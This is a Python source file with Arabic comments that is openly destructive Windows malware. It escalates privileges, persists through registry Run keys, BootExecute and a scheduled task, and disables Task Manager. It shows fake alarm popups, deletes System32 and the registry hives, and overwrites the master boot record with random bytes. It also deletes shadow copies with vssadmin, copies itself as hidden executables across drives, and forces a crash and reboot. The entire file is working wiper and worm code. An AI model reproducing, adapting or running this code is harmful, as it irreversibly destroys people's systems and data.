#!/usr/bin/env python3
# payload_fixed.py - يعمل بدون win32com أو glob (استُبدل بـ os.walk و ctypes)

import os
import sys
import time
import ctypes
import winreg
import random
import shutil
import subprocess
import threading
from ctypes import wintypes, windll, byref, create_string_buffer, c_uint, c_ulong, POINTER, cast, c_bool, c_ubyte

# =========== ثوابت إضافية ===========
HWND_BROADCAST = 0xFFFF
WM_SYSCOMMAND = 0x0112
SC_MONITORPOWER = 0xF170
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40
SE_DEBUG_NAME = "SeDebugPrivilege"
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
SE_PRIVILEGE_ENABLED = 0x2

# =========== دالة رفع الصلاحيات (بدون win32com) ===========
def enable_debug_privilege():
    try:
        advapi32 = windll.advapi32
        kernel32 = windll.kernel32
        h_token = wintypes.HANDLE()
        if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, byref(h_token)):
            return False
        luid = ctypes.c_ulonglong()
        if not advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, byref(luid)):
            return False
        # LUID_AND_ATTRIBUTES
        tp = (ctypes.c_ulong * 3)()
        tp[0] = luid.LowPart
        tp[1] = luid.HighPart
        tp[2] = SE_PRIVILEGE_ENABLED
        return bool(advapi32.AdjustTokenPrivileges(h_token, False, byref(tp), 0, None, None))
    except:
        return False

def set_critical():
    try:
        windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    except:
        pass

# =========== تثبيت التسجيل (بدون WMI) ===========
def install_registry():
    paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute")
    ]
    for hkey, subkey in paths:
        try:
            key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_WRITE | winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SysGuard", 0, winreg.REG_SZ, sys.argv[0])
            winreg.CloseKey(key)
        except:
            pass
    # مهمة مجدولة عبر schtasks (موجودة في كل ويندوز)
    try:
        subprocess.run(f'schtasks /create /tn "SysGuard" /tr "{sys.argv[0]}" /sc onstart /f /rl highest', shell=True, capture_output=True)
    except:
        pass

def block_tools():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass
    for proc in ["taskmgr.exe", "procexp.exe"]:
        subprocess.run(f"taskkill /f /im {proc}", shell=True, capture_output=True)

# =========== المرحلة الأولى – رعب صوتي وبصري (بدون win32com) ===========
def terror_audio():
    try:
        freqs = [200, 400, 800, 1600, 3200, 200, 100]
        durs = [300, 200, 150, 100, 50, 400, 500]
        for f, d in zip(freqs, durs):
            windll.kernel32.Beep(f, d)
            time.sleep(0.05)
        # صوت تحذير النظام عبر MessageBeep
        windll.user32.MessageBeep(0xFFFFFFFF)  # MB_ICONHAND
        time.sleep(0.3)
        windll.user32.MessageBeep(0x00000030)  # MB_ICONEXCLAMATION
    except:
        pass

def terror_windows():
    def msg_loop():
        while True:
            titles = ["SYSTEM ALERT", "CRITICAL", "SECURITY BREACH"]
            msgs = ["System32 deleted.", "Boot sector corrupted.", "CPU at 120C.", "All data lost."]
            windll.user32.MessageBoxW(0, random.choice(msgs), random.choice(titles), 0x10 | 0x1000)
            time.sleep(random.uniform(0.3, 1.0))
    def cmd_loop():
        while True:
            cmds = ["echo DELETING SYSTEM32...", "format C: /Q", "shutdown -r -f -t 0"]
            for c in cmds:
                subprocess.Popen(f"start cmd /c {c}", shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
                time.sleep(0.2)
    def mouse_jitter():
        while True:
            try:
                windll.user32.SetCursorPos(random.randint(0, 1920), random.randint(0, 1080))
                time.sleep(0.03)
            except:
                pass
    threading.Thread(target=msg_loop, daemon=True).start()
    threading.Thread(target=cmd_loop, daemon=True).start()
    threading.Thread(target=mouse_jitter, daemon=True).start()

# =========== المرحلة الثانية – تدمير شامل (بدون glob) ===========
def destroy_system32():
    sys32 = os.environ.get("SystemRoot", "C:\\Windows") + "\\System32"
    # حذف باستخدام os.walk بدلاً من glob
    try:
        subprocess.run(f'takeown /f "{sys32}" /r /d y', shell=True, capture_output=True)
        subprocess.run(f'icacls "{sys32}" /grant *S-1-5-32-544:F /t /q', shell=True, capture_output=True)
    except:
        pass
    # حذف ملفات تدريجياً
    for root, dirs, files in os.walk(sys32):
        for f in files:
            try:
                os.remove(os.path.join(root, f))
            except:
                pass
        for d in dirs:
            try:
                shutil.rmtree(os.path.join(root, d), ignore_errors=True)
            except:
                pass
    try:
        shutil.rmtree(sys32, ignore_errors=True)
    except:
        pass
    # جدولة حذف عند إعادة التشغيل
    try:
        MoveFileEx = windll.kernel32.MoveFileExW
        for root, dirs, files in os.walk(sys32):
            for f in files:
                path = os.path.join(root, f)
                if os.path.exists(path):
                    MoveFileEx(path, None, 0x4)
    except:
        pass

def corrupt_mbr():
    try:
        hDisk = windll.kernel32.CreateFileW(r"\\.\PhysicalDrive0", 0x10000000, 3, None, 3, 0, None)
        if hDisk and hDisk != -1:
            data = (c_ubyte * 512)()
            for i in range(512):
                data[i] = random.randint(0, 255)
            written = ctypes.c_ulong(0)
            windll.kernel32.WriteFile(hDisk, byref(data), 512, byref(written), None)
            windll.kernel32.CloseHandle(hDisk)
    except:
        pass

def delete_critical():
    criticals = [
        r"C:\boot.ini", r"C:\bootmgr", r"C:\Windows\winload.exe",
        r"C:\Windows\System32\config\SYSTEM", r"C:\Windows\System32\config\SOFTWARE",
        r"C:\Windows\System32\config\SAM", r"C:\Windows\System32\config\SECURITY"
    ]
    for p in criticals:
        try:
            os.remove(p)
        except:
            pass

def disable_recovery():
    try:
        subprocess.run("vssadmin delete shadows /all /quiet", shell=True, capture_output=True)
        subprocess.run("wmic shadowcopy delete", shell=True, capture_output=True)
    except:
        pass

def worm_spread():
    drives = ["C:", "D:", "E:"]
    exts = [".exe", ".dll", ".docx", ".pdf", ".zip"]
    for drive in drives:
        if not os.path.exists(drive):
            continue
        for root, dirs, files in os.walk(drive):
            for f in files:
                if any(f.lower().endswith(e) for e in exts):
                    try:
                        dest = os.path.join(root, random.choice(["sysupd", "winlog", "csrss"]) + ".exe")
                        shutil.copy2(sys.argv[0], dest)
                        subprocess.run(f'attrib +h "{dest}"', shell=True, capture_output=True)
                    except:
                        pass

# =========== المدخل الرئيسي ===========
def main():
    # إعادة تشغيل بصلاحيات عالية إن لزم
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.argv[0], " ".join(sys.argv[1:]), None, 1)
        sys.exit(0)
    
    enable_debug_privilege()
    set_critical()
    install_registry()
    block_tools()
    
    # إطلاق الرعب
    threading.Thread(target=terror_audio, daemon=True).start()
    threading.Thread(target=terror_windows, daemon=True).start()
    time.sleep(2)
    
    # إطلاق التدمير المتوازي
    for func in [destroy_system32, corrupt_mbr, delete_critical, disable_recovery, worm_spread]:
        threading.Thread(target=func, daemon=True).start()
    
    time.sleep(4)
    # إسقاط النظام
    try:
        ntdll = windll.ntdll
        ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_bool()))
        ntdll.NtRaiseHardError(0xC000021A, 0, 0, None, 6, byref(c_uint()))
    except:
        pass
    subprocess.run("shutdown /r /f /t 0", shell=True)

if __name__ == "__main__":
    main()
